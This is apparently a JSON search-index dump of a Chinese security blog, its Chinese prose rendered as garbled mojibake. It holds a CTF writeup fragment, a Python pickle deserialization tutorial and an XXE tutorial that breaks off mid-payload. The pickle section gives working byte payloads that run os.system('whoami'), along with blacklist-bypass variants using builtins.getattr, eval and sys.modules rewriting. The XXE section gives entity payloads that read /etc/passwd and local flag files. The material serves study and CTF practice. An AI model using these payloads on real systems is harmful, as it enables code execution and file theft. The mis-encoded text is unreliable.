web3_è«è´Ÿå©µå¨Ÿç¬¬ä¸€å…³LIKEæ³¨å…¥ï¼Œå‘ç°æ²¡æœ‰è¿‡æ»¤_ï¼Œäºæ˜¯å…ˆç”¨_çˆ†å‡ºå¯†ç ä½æ•°ï¼Œç„¶åä¸€ä½ä¸€ä½çˆ†ç ´ï¼Œè¿›å…¥ç¬¬äºŒå…³ã€‚ ç¬¬äºŒå…³å‘½ä»¤æ‰§è¡Œï¼Œè¿‡æ»¤äº†æ‰€æœ‰å°å†™å­—æ¯ï¼Œä½¿ç”¨ç¯å¢ƒå˜é‡$pathæ„é€ å‡ºnl ????.???è¯»å–flag.phpã€‚ 1$&#123;PATH:14:1&#125;$&#123;PATH:21:1&#125; ????.???","categories":[{"name":"ä¸“é¢˜  writeup","slug":"ä¸“é¢˜-writeup","permalink":"http://yoursite.com/categories/ä¸“é¢˜-writeup/"}],"tags":[]},{"title":"Pickleååºåˆ—åŒ–","slug":"Pickleååºåˆ—åŒ–","date":"2020-09-20T16:00:00.000Z","updated":"2020-10-23T13:13:07.896Z","comments":true,"path":"2020/09/21/Pickleååºåˆ—åŒ–/","link":"","permalink":"http://yoursite.com/2020/09/21/Pickleååºåˆ—åŒ–/","excerpt":"","text":"Pickleååºåˆ—åŒ–çš„åˆ†æä¸åˆ©ç”¨æœ¬æ–‡é¦–å‘äºå…ˆçŸ¥https://xz.aliyun.com/t/8342 ååºåˆ—åŒ–è¿‡ç¨‹åˆ†æpickle.dump()æ–¹æ³•å¯ä»¥å°†å¯¹è±¡åºåˆ—åŒ–ã€‚ 12345678import pickleclass animal: def __init__(self,animal): self.animal=animal test=pickle.dumps(animal(&quot;dog&quot;))print(test) 1b&apos;\\x80\\x03c__main__\\nanimal\\nq\\x00)\\x81q\\x01&#125;q\\x02X\\x06\\x00\\x00\\x00animalq\\x03X\\x03\\x00\\x00\\x00dogq\\x04sb.&apos; ä½¿ç”¨pickle.loads()æ–¹æ³•ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼ŒæŸ¥çœ‹ä¸€ä¸‹loadsæ–¹æ³•çš„æºç ã€‚ 123456def _loads(s, *, fix_imports=True, encoding=\"ASCII\", errors=\"strict\"): if isinstance(s, str): raise TypeError(\"Can't load pickle from unicode string\") file = io.BytesIO(s) return _Unpickler(file, fix_imports=fix_imports, encoding=encoding, errors=errors).load() è·Ÿè¿›_Unpicklerç±»çš„loadæ–¹æ³•,é‡ç‚¹åœ¨ä¸‹é¢è¿™ä¸€æ®µä»£ç ï¼š åœ¨dispatchå­—å…¸ä¸­ä»¥opcode=&gt;functionçš„è¡Œå¼å­˜æ”¾äº†è®¸å¤šæ–¹æ³•ï¼Œç¨‹åºä»åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¯»å–æ•°æ®(opcode)ï¼Œç¨‹åºé€šè¿‡opcodeç´¢å¼•æ‰§è¡Œå¯¹åº”çš„æ–¹æ³•.ã€‚ 123456789try: while True: key = read(1) if not key: raise EOFError assert isinstance(key, bytes_types) dispatch[key[0]](self)except _Stop as stopinst: return stopinst.value æ‹¿ä¸Šé¢çš„åºåˆ—åŒ–å­—ç¬¦ä¸²å½“ä½œä¾‹å­,é€æ­¥åˆ†ææ•´ä¸ªåºåˆ—åŒ–è¿‡ç¨‹ã€‚ ç¬¬ä¸€æ­¥ï¼šè¯»å–åˆ°\\x80ï¼Œé€šè¿‡dispatchå­—å…¸ç´¢å¼•ï¼Œè°ƒç”¨load_protoæ–¹æ³•ï¼ˆæ¥ä¸‹æ¥ä¸å†å°†å‡½æ•°è´´å‡ºæ¥ï¼Œæ¨èè‡ªå·±é…åˆæºç é˜…è¯»ï¼‰ 12345def load_proto(self): proto = self.read(1)[0] if not 0 &lt;= proto &lt;= HIGHEST_PROTOCOL: raise ValueError(\"unsupported pickle protocol: %d\" % proto) self.proto = proto ç¨‹åºç»§ç»­è¯»å–ä¸€ä¸ªå­—èŠ‚ï¼Œè¯»å–åˆ°\\x03ï¼Œå®ƒçš„æ„æ€æ˜¯ï¼šè¿™æ˜¯ä¸€ä¸ªæ ¹æ®ä¸‰å·åè®®åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ã€‚ ç¬¬äºŒéƒ¨ï¼šè¯»å–åˆ°c (GLOBALæ“ä½œç ) ï¼Œç¨‹åºå¾€å‰è¯»å–ä¸¤è¡Œå­—ç¬¦ä¸²ï¼Œè·å–åŸŸåç©ºé—´ä¸ç±»åmodule=__main__,name=animalï¼Œè°ƒç”¨find_classå‡½æ•°è·å–åˆ°animalå¯¹è±¡ï¼Œå¹¶å‹å…¥æ ˆstackä¸­ã€‚ 1stack:[&lt;class '__main__.animal'&gt;] ç¬¬ä¸‰æ­¥ï¼šè¯»å–åˆ°qï¼ˆbinputæ“ä½œç ï¼‰ï¼Œç»§ç»­è¯»å–ä¸‹ä¸€ä¸ªå­—èŠ‚ä¸º0ï¼Œå¯¹åº”çš„æ“ä½œä¸ºï¼šå°†stackä¸­æ ˆå°¾çš„æ•°æ®ä¿å­˜åˆ°memoå­—å…¸ä¸­çš„0å·ä½ç½®(å¯ä»¥ç†è§£ä¸ºé€æ­¥ä¿å­˜stackä¸­çš„æ•°æ®ï¼Œæ–¹ä¾¿ä¹‹åè°ƒç”¨)ã€‚ ç¬¬å››æ­¥ï¼šè¯»å–åˆ°)ï¼ˆEMPTY_TUPLEæ“ä½œç ï¼‰ï¼Œå¾€æ ˆä¸­å‹å…¥ç©ºçš„å…ƒç»„ã€‚ 1stack:[&lt;class '__main__.animal'&gt;,()] ç¬¬äº”æ­¥ï¼šè¯»å–åˆ°\\x81ï¼ˆNEW_OBJï¼‰ï¼Œå¼¹å‡º()èµ‹å€¼ç»™argsï¼Œç„¶åå†å¼¹å‡º&lt;class &#39;__main__.animal&#39;&gt;èµ‹å€¼ç»™clsï¼Œåœ¨è¿™é‡Œæ˜¯animalå¯¹è±¡ï¼Œä¹‹åç”¨cls.__new__(cls,*args)å®ä¾‹åŒ–è¯¥å¯¹è±¡å¹¶å‹å…¥æ ˆä¸­ï¼Œ__new__æ–¹æ³•çš„ä½œç”¨æ˜¯ä¿®æ”¹ä¸å¯å˜ç±»ï¼ˆIntï¼ŒStringç­‰åŸºæœ¬ç±»å‹éƒ½æ˜¯ä¸å¯å˜ç±»ï¼‰ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬ä¸éœ€è¦ä¿®æ”¹ï¼Œæ‰€ä»¥å°±ä¼ å…¥ç©ºçš„å…ƒç»„ã€‚ 1stack:[&lt;class '__main__.animal'&gt;] ç¬¬å…­æ­¥ï¼šè¯»å–åˆ°q\\x01å°†ä¸Šé¢å®ä¾‹åŒ–çš„å¯¹è±¡ä¿å­˜åˆ°memo[1]ä¸­ã€‚ ç¬¬ä¸ƒæ­¥ï¼šè¯»å–åˆ°}ï¼Œå¾€æ ˆä¸­å‹å…¥ç©ºçš„å­—å…¸ã€‚ 1stack:[&lt;class &apos;__main__.animal&apos;&gt;,&#123;&#125;] ç¬¬å…«æ­¥ï¼šè¯»å–åˆ°q\\x02å°†è¯¥å­—å…¸å­˜åˆ°memo[2]ä¸­ã€‚ ç¬¬ä¹æ­¥ï¼šè¯»å–åˆ°Xç»§ç»­å‘å‰è¯»å–å››ä¸ªå­—èŠ‚ä»£è¡¨å­—ç¬¦ä¸²é•¿åº¦ï¼Œ\\x06\\x00\\x00\\x00è·å¾—å­—ç¬¦ä¸²é•¿åº¦ä¸º6ï¼Œæ¥ç€ç»§ç»­å¾€åè¯»å–å…­ä¸ªå­—ç¬¦animalï¼Œå­˜å…¥æ ˆä¸­ã€‚ 1stack:[&lt;class '__main__.animal'&gt;,&#123;&#125;,animal] ç¬¬ä¹æ­¥ï¼šè¯»å–åˆ°q\\x03å°†ä¸Šé¢çš„å­—ç¬¦ä¸²ä¿å­˜åˆ°memo[3]ä¸­ã€‚ ç¬¬åæ­¥ï¼šç»§ç»­å‘å‰æå–å‡ºdogå¹¶ä¿å­˜åˆ°memo[4]ä¸­ã€‚ 1stack:[&lt;class &apos;__main__.animal&apos;&gt;,&#123;&#125;,animal,dog] ç¬¬åä¸€æ­¥ï¼šè¯»å–åˆ°s(SETITEMæ“ä½œç¬¦)ï¼Œå¼¹å‡ºæ•°æ®ä½œä¸ºå€¼ï¼Œå†å¼¹å‡ºæ•°æ®ä½œä¸ºå¥ï¼Œæœ€åå¼¹å‡ºä¸€ä¸ªæ•°æ® (ä¸€å®šè¦æ˜¯å­—å…¸ç±»å‹) ï¼Œä»¥é”®å€¼å¯¹çš„å½¢å¼å°†æ•°æ®å­˜å…¥è¯¥å­—å…¸ä¸­ï¼Œ{â€˜animalâ€™:â€™dogâ€™}`,å¹¶å…¥æ ˆã€‚ 1stack:[&lt;class '__main__.animal'&gt;,&#123;'animal':'dog'&#125;] ç¬¬åäºŒæ­¥ï¼šè¯»å–åˆ°b(BUILDæ“ä½œç¬¦)ï¼Œä»æ ˆä¸­å¼¹å‡ºå­—å…¸ç±»å‹çš„æ•°æ®èµ‹å€¼ç»™stateï¼Œå¼¹å‡º&lt;class &#39;__main__.animal&#39;&gt;èµ‹å€¼ç»™inst,å¦‚æœinstä¸­å­˜åœ¨__setstate__æ–¹æ³•ï¼Œåˆ™ç›´æ¥ç”¨setstateæ¥å¤„ç†statesetstate(state)ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œåˆ™ç›´æ¥å°†stateå­˜å…¥inst.__dict__ä¸­ã€‚ ç¬¬åä¸‰æ­¥ï¼šè¯»å–åˆ°.ï¼Œç»“æŸååºåˆ—åŒ–ã€‚ ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ä»ä¸Šé¢çš„ååºåˆ—åŒ–è¿‡ç¨‹æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œpythonçš„ååºåˆ—åŒ–è¿‡ç¨‹æ˜¯å®Œå…¨å¯æ§çš„ï¼Œæ¥ä¸‹æ¥ä»‹ç»å‡ ç§å¸¸ç”¨çš„åˆ©ç”¨æŠ€å·§ã€‚ å…¨å±€å˜é‡å¼•å…¥åœ¨ç¢°åˆ°sæ“ä½œç æ—¶ï¼Œä¼šå¼¹å‡ºä¸¤ä¸ªå­—ç¬¦ä¸²ä½œä¸ºé”®å€¼å¯¹ä¿å­˜åˆ°å­—å…¸ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡cæ“ä½œç æ¥å¾—åˆ°secret.bestï¼Œå†ä½¿animal=secret.bestï¼Œè¿™æ ·å°±æˆåŠŸå¼•å…¥äº†å…¨å±€å˜é‡ã€‚ 1234567891011import pickleimport secretclass animal: def __init__(self): self.animal=\"dog\" def check(self): if self.animal==secret.best: print(\"good!\")code=\"your code\"pickle.loads(code) 1payload=b'\\x80\\x03c__main__\\nanimal\\nq\\x00)\\x81q\\x01&#125;q\\x02X\\x06\\x00\\x00\\x00animalq\\x03csecret\\nbest\\nq\\x04sb.' å…¨å±€å˜é‡ä¿®æ”¹cæ“ä½œç¬¦æ˜¯é€šè¿‡è°ƒç”¨find_classæ–¹æ³•æ¥è·å–å¯¹è±¡ï¼Œè€Œfind_classä½¿ç”¨sys.modules[module],name)æ¥è·å–åˆ°ç›¸åº”çš„å±æ€§ï¼Œsys.modulesæ˜¯ä¸€ä¸ªå…¨å±€å­—å…¸ï¼Œè¯¥å­—å…¸æ˜¯pythonå¯åŠ¨åå°±åŠ è½½åœ¨å†…å­˜ä¸­ã€‚æ¯å¯¼å…¥æ–°çš„æ¨¡å—ï¼Œsys.modulesä¼šå°†è¯¥æ¨¡å—å¯¼å…¥å­—å…¸ä¸­ã€‚ åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œå¯¼å…¥äº†secretæ¨¡å—ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡cæ“ä½œç¬¦è·å–åˆ°secretæ¨¡å—å¹¶å¯¹secret.bestè¿›è¡Œé‡æ„ï¼Œå†åŸºäºæ­¤æ„é€ animalç±»ã€‚ 1payload=b'\\x80\\x03c__main__\\nsecret\\nq\\x00q\\x01&#125;X\\x04\\x00\\x00\\x00bestX\\x03\\x00\\x00\\x00dogsb0c__main__\\nanimal\\n)\\x81&#125;X\\x06\\x00\\x00\\x00animalX\\x03\\x00\\x00\\x00dogsb.' å‡½æ•°æ‰§è¡Œä¸å‡½æ•°æ‰§è¡Œæœ‰å…³çš„æ“ä½œç æœ‰r,i,o,b iæ“ä½œç iæ“ä½œç çš„ä»£ç å¦‚ä¸‹ï¼š 123456def load_inst(self): module = self.readline()[:-1].decode(\"ascii\") name = self.readline()[:-1].decode(\"ascii\") klass = self.find_class(module, name) self._instantiate(klass, self.pop_mark())dispatch[INST[0]] = load_inst é¦–å…ˆé€šè¿‡find_classè·å¾—æ–¹æ³•ï¼Œç„¶åé€šè¿‡pop_markè·å¾—å‚æ•°ï¼Œå¹¶è°ƒç”¨_instantiateå‡½æ•°æ¥æ‰§è¡Œï¼Œå¹¶å°†æ‰§è¡Œçš„ç»“æœå­˜å…¥æ ˆä¸­ã€‚ 12345def pop_mark(self): items = self.stack self.stack = self.metastack.pop() self.append = self.stack.append return items ç›¸å…³æ“ä½œæ˜¯è·å–å½“å‰æ ˆä¸Šçš„å†…å®¹ï¼Œç„¶åå°†å¼¹å‡ºå‰åºæ ˆé‡æ–°èµ‹å€¼ç»™å½“å‰æ ˆï¼Œç„¶åè¿”å›itemä½œä¸ºå‚æ•°ã€‚ æ‰€ä»¥æˆ‘ä»¬é¦–å…ˆç”¨(æ“ä½œç¬¦å°†å½“å‰æ ˆstackä¸­çš„å†…å®¹å­˜åˆ°å‰åºæ ˆä¸­ï¼Œé€šè¿‡iæ“ä½œç¬¦è·å–åˆ°os.systemå¹¶æ‰§è¡ŒwhoamiæŒ‡ä»¤ã€‚ 1payload=b'(X\\x06\\x00\\x00\\x00whoamiios\\nsystem\\n.' æˆåŠŸæ‰§è¡Œos.system(â€˜whoamiâ€™)ã€‚ Ræ“ä½œç Ræ“ä½œç çš„ä»£ç å¦‚ä¸‹ã€‚ 123456def load_reduce(self): stack = self.stack args = stack.pop() func = stack[-1] stack[-1] = func(*args)dispatch[REDUCE[0]] = load_reduce åˆ†æä¸€ä¸‹ï¼Œå¼¹æ ˆä½œä¸ºå‚æ•°(å¿…é¡»æ˜¯å…ƒç»„)ï¼Œå°†æ ˆä¸­æœ€åä¸€ä¸ªæ•°æ®ä½œä¸ºå‡½æ•°ï¼Œå¹¶ç”¨æ‰§è¡Œç»“æœå°†å‡½æ•°è¦†ç›–ã€‚ æ‰€ä»¥å¯ä»¥è¿™ä¹ˆæ„é€ cos\\nsystem\\nX\\x06\\x00\\x00\\x00whoami\\x85Rï¼Œ\\x85çš„ä½œç”¨æ˜¯ å°†æ ˆä¸­æœ€åä¸€ä¸ªæ•°æ®å˜æˆå…ƒç»„é‡æ–°å…¥æ ˆã€‚ 1stack:[&lt;built-in function system&gt;,(whoami)] æˆåŠŸæ‰§è¡Œos.system(â€˜whoamiâ€™)ã€‚ 1payload=b'cos\\nsystem\\nX\\x06\\x00\\x00\\x00whoami\\x85R.' oæ“ä½œç oæ“ä½œç çš„ä»£ç å¦‚ä¸‹ï¼š 123456def load_obj(self): # Stack is ... markobject classobject arg1 arg2 ... args = self.pop_mark() cls = args.pop(0) self._instantiate(cls, args)dispatch[OBJ[0]] = load_obj oæ“ä½œç å°†å‡½æ•°ä¸å‚æ•°å¼¹æ ˆåï¼Œç›´æ¥äº¤ç»™_instantiateæ‰§è¡Œï¼Œå¹¶å°†æ‰§è¡Œç»“æœå­˜å…¥æ ˆä¸­ã€‚ 1payload=b'(cos\\nsystem\\nX\\x06\\x00\\x00\\x00whoamio.' bæ“ä½œç åœ¨bæ“ä½œç æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå¦‚æœç¢°åˆ°è‡ªå®šä¹‰çš„__setstate__ï¼Œå°±ä¼šæ‰§è¡Œä»¥ä¸‹ä»£ç ã€‚ 1234setstate = getattr(inst, \"__setstate__\", None)if setstate is not None: setstate(state) return å¦‚æœå­˜åœ¨__setstate__æ–¹æ³•,å°±ç›´æ¥æ‰§è¡Œsetstateæ–¹æ³•ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡æ„é€ __setstate__æ¥è¿›è¡Œä»»æ„å‡½æ•°æ‰§è¡Œã€‚ 1payload=b'\\x80\\x03c__main__\\nanimal\\n)\\x81&#125;X\\x0C\\x00\\x00\\x00__setstate__cos\\nsystem\\nsbX\\x06\\x00\\x00\\x00whoamib.' é¦–å…ˆBUILEä¸€æ¬¡animalå¯¹è±¡å°†{&#39;__setstate__&#39;: os.system}å­—å…¸æ”¾å…¥animalç±»çš„__dict__å­—å…¸ä¸­ï¼Œç„¶åç”¨whoamiå†æ¬¡è¿›è¡ŒBUILDï¼Œæ­¤æ—¶stateä¸ºwhoamiï¼Œç”±äºå­˜åœ¨__setstate__æ–¹æ³•ï¼Œæ‰€ä»¥æˆåŠŸæ‰§è¡Œos.system(â€˜whoamiâ€™)ã€‚ WAFç»•è¿‡ç›®å‰ä¸»è¦çš„æ¼æ´åˆ©ç”¨éƒ½æ˜¯é€šè¿‡find_classå¼•å…¥os.systemç­‰å‡½æ•°å‡½æ•°ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡é‡å†™fine_classæ·»åŠ é»‘åå•ç­‰é™åˆ¶ï¼Œæ¥ä¿æŠ¤è‡ªå·±çš„ç¨‹åºã€‚ é»‘åå•ç»•è¿‡æ„é€ getattrå‡½æ•°å¯ä»¥ä½¿ç”¨builtinsæ¨¡å—æ„é€ getattrå‡½æ•°ï¼Œä¸å†ç»è¿‡find_classï¼Œå°±èƒ½ç»•è¿‡WAFå®ç°ä»»æ„å‡½æ•°æ‰§è¡Œã€‚ 12Ræ“ä½œç payload=b'\\x80\\x03cbuiltins\\ngetattr\\np0\\ncbuiltins\\ndict\\np1\\nX\\x03\\x00\\x00\\x00get\\x86Rp2\\n0g2\\ncbuiltins\\nglobals\\n)RX\\x0C\\x00\\x00\\x00__builtins__\\x86Rp3\\n0g0\\ng3\\nX\\x04\\x00\\x00\\x00eval\\x86Rp4\\n0g4\\nX\\x21\\x00\\x00\\x00__import__(\"os\").system(\"whoami\")\\x85R.' 1oæ“ä½œç ï¼špayload=b'\\x80\\x03(cbuiltins\\ngetattr\\np0\\ncbuiltins\\ndict\\np1\\nX\\x03\\x00\\x00\\x00getop2\\n0(g2\\n(cbuiltins\\nglobals\\noX\\x0C\\x00\\x00\\x00__builtins__op3\\n(g0\\ng3\\nX\\x04\\x00\\x00\\x00evalop4\\n(g4\\nX\\x21\\x00\\x00\\x00__import__(\"os\").system(\"whoami\")o.' é€šè¿‡builtinsæ¨¡å—æ„é€ getattrï¼Œè·å¾—dictç±»çš„getæ–¹æ³•ï¼Œä½¿ç”¨getæ–¹æ³•å–å¾—__builtins__å­—å…¸ä¸­çš„evalå‡½æ•°ï¼Œç„¶åä½¿ç”¨__import__å‡½æ•°çš„å¯¼å…¥osï¼ŒæˆåŠŸæ‰§è¡Œos.system(â€œwhoamiâ€)ã€‚ ç»•è¿‡æ¨¡å—åç§°é™åˆ¶é‡å†™sys.modulesä¹‹å‰è¯´è¿‡find_classä½¿ç”¨sys.modules[module],name)æ¥å¼•å…¥æ¨¡å—ï¼Œä½†æ˜¯sysè‡ªèº«ä¹Ÿåœ¨sys.modulesä¸­ï¼Œæ‰€ä»¥é€šè¿‡sæ“ä½œç¬¦ä½¿sys.modules[â€˜sysâ€™]=sys.modulesï¼Œsysæ¨¡å—ä¹Ÿå°±å˜æˆäº†sys.modulesæ¨¡å—ï¼Œç„¶åå¼•å…¥sys.modulesä¸­çš„getæ–¹æ³•ï¼Œå–å¾—sys.moduleså­—å…¸ä¸­çš„osæ¨¡å—ï¼Œå†ä½¿ç”¨sæ“ä½œç¬¦ä½¿sys.modules[â€˜sysâ€™]=osï¼Œå½“å‰sysæ¨¡å—å°±å˜æˆäº†osæ¨¡å—ï¼Œæœ€åæˆåŠŸæ‰§è¡Œos.system(â€œwhoamiâ€)ã€‚ 12Ræ“ä½œç payload=b'csys\\nmodules\\np0\\nX\\x03\\x00\\x00\\x00sysg0\\nscsys\\nget\\np1\\ng1\\nX\\x02\\x00\\x00\\x00os\\x85Rp2\\ng0\\nX\\x03\\x00\\x00\\x00sysg2\\nscsys\\nsystem\\nX\\x06\\x00\\x00\\x00whoami\\x85R.' 12oæ“ä½œç payload=b'csys\\nmodules\\np0\\nX\\x03\\x00\\x00\\x00sysg0\\ns(csys\\nget\\np1\\nX\\x02\\x00\\x00\\x00osop2\\ng0\\nX\\x03\\x00\\x00\\x00sysg2\\ns(csys\\nsystem\\nX\\x06\\x00\\x00\\x00whoamio.' å‚è€ƒæ–‡ç«  https://xz.aliyun.com/t/7436#toc-11 https://zhuanlan.zhihu.com/p/89132768","categories":[{"name":"ä¸“é¢˜  Python","slug":"ä¸“é¢˜-Python","permalink":"http://yoursite.com/categories/ä¸“é¢˜-Python/"}],"tags":[]},{"title":"XMLå­¦ä¹ ","slug":"XXEä¸“é¢˜","date":"2020-06-29T16:00:00.000Z","updated":"2020-11-28T07:21:12.227Z","comments":true,"path":"2020/06/30/XXEä¸“é¢˜/","link":"","permalink":"http://yoursite.com/2020/06/30/XXEä¸“é¢˜/","excerpt":"","text":"XXEå­¦ä¹ è®°å½•â€‹ â€‹ XXEä¹Ÿå°±æ˜¯XMLå¤–éƒ¨å®ä½“æ³¨å…¥ï¼Œè¿™ä¸»è¦æ˜¯DTDæ–‡ä»¶å¯¼è‡´çš„ã€‚ DTDç®€ä»‹â€‹ æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰å¯å®šä¹‰åˆæ³•çš„XMLæ–‡æ¡£æ„å»ºæ¨¡å—ã€‚å®ƒä½¿ç”¨ä¸€ç³»åˆ—åˆæ³•çš„å…ƒç´ æ¥å®šä¹‰æ–‡æ¡£çš„ç»“æ„ã€‚ DTD å¯è¢«æˆè¡Œåœ°å£°æ˜äº XML æ–‡æ¡£ä¸­ï¼Œä¹Ÿå¯ä½œä¸ºä¸€ä¸ªå¤–éƒ¨å¼•ç”¨ã€‚å‡å¦‚ DTD è¢«åŒ…å«åœ¨æ‚¨çš„ XML æºæ–‡ä»¶ä¸­ï¼Œå®ƒåº”å½“é€šè¿‡ä¸‹é¢çš„è¯­æ³•åŒ…è£…åœ¨ä¸€ä¸ª DOCTYPE å£°æ˜ä¸­ï¼š &lt;!DOCTYPE æ ¹å…ƒç´ å [element-declarations]&gt;ï¼Œå¦‚æœDTDä½äºXMLæºæ–‡ä»¶å¤–ï¼Œé‚£ä¹ˆå®ƒåº”é€šè¿‡ä¸‹é¢çš„è¯­æ³•è¢«å°è£…åœ¨ä¸€ä¸ª DOCTYPE å®šä¹‰ä¸­ï¼š 123&lt;!DOCTYPE æ ¹å…ƒç´ åç§° SYSTEM &quot;filename&quot;&gt;&lt;!DOCTYPE æ ¹å…ƒç´ åç§° PUBLIC â€œDTDæ ‡è¯†åâ€ â€œå…¬ç”¨DTDçš„URIâ€&gt; â€‹ è¿™ä¸ªSYSTEM/PUBLICå…³é”®å­—å°±æ˜¯å¯¼è‡´XXEæ³¨å…¥çš„å…³é”®ï¼Œç»è¿‡ç ”ç©¶JAVAè§£æDTDæ–‡ä»¶æ—¶ï¼Œé€šè¿‡æ–‡ä»¶æµå°†SYSTEMå…³é”®å­—åé¢çš„å€¼å½“ä½œURLè¯»å–æ–‡ä»¶ï¼Œè€ŒJAVAæ–‡ä»¶æµæ”¯æŒHTTPã€FTPã€JARã€FILEç­‰ç­‰åè®®ï¼Œåœ¨PHPä¸­æƒ…å†µä¹Ÿç±»ä¼¼ï¼Œæ”¯æŒPHPä¼ªåè®®ã€pharç­‰ç­‰åè®®ã€‚ â€‹ åœ¨DTDä¸­å¯ä»¥å®šä¹‰é€šç”¨å®ä½“å’Œå‚æ•°å®ä½“ã€‚ â€‹ 1ã€é€šç”¨å®ä½“ â€‹ é€šç”¨å®ä½“èƒ½åœ¨XMLæ–‡æ¡£ä¸­å¼•ç”¨ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 12345&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM \"file:///etc/passwd\"&gt; ]&gt; &lt;root&gt; &lt;test&gt;&amp;xxe;&lt;/test&gt;&lt;/root&gt; â€‹ 2ã€å‚æ•°å®ä½“ â€‹ å‚æ•°å®ä½“åªèƒ½åœ¨DTDæ–‡ä»¶ä¸­å¼•ç”¨ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š test1.dtd 12&lt;!ENTITY % in1 SYSTEM &quot;test2.dtd&quot;&gt;%in1;%out; test2.dtd 1&lt;!ENTITY % out &quot;&lt;!ENTITY writer &apos;111&apos;&gt;&quot; &gt; â€‹ å…³äºDTDçš„åŸºæœ¬çŸ¥è¯†å°±ä»‹ç»åˆ°è¿™é‡Œï¼Œæ¥ä¸‹æ¥å°è¯•ä¸€ä¸‹XXEæ”»å‡»ï¼Œæœ¬æ–‡ä½¿ç”¨PHPç¯å¢ƒã€‚ æœ‰å›æ˜¾çš„XXEé¦–å…ˆæ­å»ºä¸€ä¸ªç®€å•çš„è§£æXMLæ–‡æ¡£çš„PHPæœåŠ¡,ç›®æ ‡æ˜¯è¯»å–flag.phpæ–‡ä»¶ã€‚ 12345678&lt;?php libxml_disable_entity_loader (false); $xmlfile = file_get_contents('php://input'); $dom = new DOMDocument();//åˆ›å»ºæ–‡æ¡£å¯¹è±¡ $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);/æŒ‡å®šè§£æå™¨ $creds = simplexml_import_dom($dom);//å°†DOMå¯¹è±¡è½¬æ¢æˆXMLå¯¹è±¡ echo $creds;//è¾“å‡º?&gt; æˆ‘ä»¬è¿™é‡Œä¸»è¦æ¢è®¨Dataåè®® 12345&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY xxe SYSTEM \"data://text/plain;base64,ZmlsZTovLy9DOi9waHBTdHVkeS9QSFBUdXRvcmlhbC9XV1cvZmxhZy5waHA=\"&gt; ]&gt; &lt;root&gt;&amp;xxe;&lt;/root&gt; ç»è¿‡dataåè®®åªèƒ½è·å–ä¸€äº›åŠ å¯†çš„å€¼,å¹¶ä¸èƒ½ç›´æ¥è¾¾åˆ°è¯»å–æ–‡ä»¶çš„æ•ˆæœï¼Œä½†æ˜¯dataåè®®çš„åŠ å¯†å¯ä»¥ç»•è¿‡è®¸å¤šå…³é”®å­—è¿‡æ»¤ï¼Œæˆ‘çš„åˆæ­¥æƒ³æ³•æ˜¯å°†dataåè®®è¯»å‡ºæ¥çš„æ•°æ®æ‹¼å‡‘å‡ºä¸€ä¸ªæ–°çš„å®ä½“ã€‚ ç›´æ¥æ‹¼å‡‘å¤±è´¥äº†ï¼ŒSYSTEMåé¢çš„%xxe;ç›´æ¥è¢«å½“æˆurlè§£æäº†ï¼Œäºæ˜¯å°è¯•åˆ†æ­¥æ‹¼å‡‘ã€‚ å‘ç°æŠ¥é”™PEReferences forbidden in internal subset in Entity PEReferences æŒ‡çš„æ˜¯å‚æ•°å®ä½“å¼•ç”¨(Parameter Entity Reference)ï¼Œç¦æ­¢åœ¨å†…éƒ¨Entityä¸­å¼•ç”¨å‚æ•°å®ä½“ï¼Œé‚£å°±ç”¨å¤–éƒ¨DTDè¯•è¯•ã€‚ 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY % xxe SYSTEM &quot;data://text/plain;base64,ZmlsZTovLy9DOi9waHBTdHVkeS9QSFBUdXRvcmlhbC9XV1cvZmxhZy5waHA=&quot;&gt;&lt;!ENTITY % out SYSTEM &quot;file:///C:/phpStudy/PHPTutorial/WWW/out.dtd&quot;&gt;%out;%all; ]&gt; &lt;root&gt;&amp;a;&lt;/root&gt; out.dtd 12&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY a SYSTEM &apos;%xxe;&apos;&gt;&quot; &gt; ç†ä¸€ä¸‹æ€è·¯ï¼Œé¦–å…ˆåœ¨åœ¨payloadä¸­å®Œæˆdataåè®®ä¿¡æ¯è¯»å–ï¼Œç„¶åå†å¤–éƒ¨dtdè¿›è¡Œæ‹¼å‡‘ï¼Œæœ€åå†å¼•ç”¨æ‹¼å‡‘çš„å®ä½“è¿›è¡Œæ–‡ä»¶è¯»å–ï¼Œè¿™æ ·å¯ä»¥ç»•è¿‡è®¸å¤šWAFã€‚ é¡ºå¸¦ä¸€æï¼Œå½“æ–‡ä»¶ä¸­å«æœ‰&gt;,%,&amp;ç­‰å­—ç¬¦æ—¶ï¼ŒXMLè§£æä¼šæŠ¥é”™ï¼Œä¸èƒ½è¯»å–å‡ºæ–‡ä»¶å†…å®¹ï¼Œè¿™æ˜¯å¯ä»¥ç”¨CDATAæ¥åŒ…è£¹æ–‡ä»¶å†…å®¹ï¼Œå†CDATAä¸­çš„æ•°æ®ä¸ä¼šè¢«XMLè§£æï¼Œä¹Ÿéœ€è¦ç”¨åˆ°å¤–éƒ¨dtdï¼Œè¿™é‡Œå°±ç›´æ¥æ”¾å…³é”®éƒ¨åˆ†payload 1234&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt; &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt; &lt;!ENTITY % end &quot;]]&gt;&quot;&gt; &lt;!ENTITY % dtd SYSTEM 